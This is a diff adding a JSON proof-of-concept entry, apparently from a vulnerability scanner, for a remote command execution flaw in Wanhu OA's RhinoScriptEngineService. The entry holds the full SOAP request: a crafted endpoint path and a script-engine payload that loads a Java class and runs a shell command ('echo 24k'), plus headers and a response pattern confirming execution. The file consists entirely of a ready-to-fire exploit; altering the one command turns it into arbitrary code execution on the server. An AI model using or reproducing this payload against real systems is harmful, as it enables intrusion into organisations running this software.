@@ -1,0 +1,21 @@
+{
+	"name":"万户OA-RhinoScriptEngineService命令执行",
+	"tag":"wanhu",
+	"type":"exec",
+	"poc":{
+		"pocGet":"/defaultroot/services/./././RhinoScriptEngineService",
+		"pocPost":"<?xml version='1.0' encoding='UTF-8'?>\r\n         <soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:jav=\"http://javascript.script.sun.com\">\r\n           <soapenv:Body>\r\n             <eval xmlns=\"http://127.0.0.1:8080/services/scriptEngine\">\r\n               <arg0 xmlns=\"\">\r\n                 <![CDATA[\r\n                 try {\r\n                 load(\"nashorn:Moziilla_compat.js\");\r\n                 } catch (e) {\r\n                 }\r\n                 importPackage(Packages.java.io);\r\n                 importPackage(Packages.java.lang);\r\n                 importPackage(Packages.java.util);\r\n                 importPackage(Packages.java.net);\r\n\r\n                 new URLClassLoader([new File('../server').toURL()]).loadClass('Test12').getConstructor([Class.forName(\"java.lang.String\")]).newInstance([\"echo 24k\"]).toString()\r\n\r\n                 ]]>\r\n               </arg0>\r\n               <arg1 xmlns=\"\" xsi:type=\"urn:SimpleScriptContext\" xmlns:urn=\"urn:beanservice\">\r\n               </arg1>\r\n             </eval>\r\n           </soapenv:Body>\r\n         </soapenv:Envelope>",
+		"header":{
+			"SOAPAction":" '\"\"'",
+			"Accept":" */*",
+			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
+			"Connection":" close",
+			"Accept-Encoding":" gzip, deflate",
+			"Accept-Language":" en",
+			"Content-Length":" 1191",
+			"Content-Type":" text/xml;charset=UTF-8"
+		},
+		"status_code":"200",
+		"pattern":"(24k)"
+	}
+}
